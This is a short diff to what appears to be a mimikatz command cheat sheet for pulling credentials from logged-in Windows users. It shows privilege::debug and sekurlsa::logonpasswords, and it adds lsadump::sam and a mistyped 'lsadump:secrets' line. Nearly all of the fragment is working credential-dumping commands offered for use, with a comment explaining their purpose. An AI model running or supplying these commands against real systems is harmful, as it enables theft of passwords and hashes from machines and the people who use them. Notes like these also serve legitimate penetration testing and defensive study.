@@ -5,8 +5,9 @@
 #Once in the mimikatz session we upgrade our privilege token and retrieve the credentials from the log-in users 
 
 privilege::debug
-
 sekurlsa::logonpasswords
+lsadump::sam
+lsadump:secrets
 
 # Or 
 
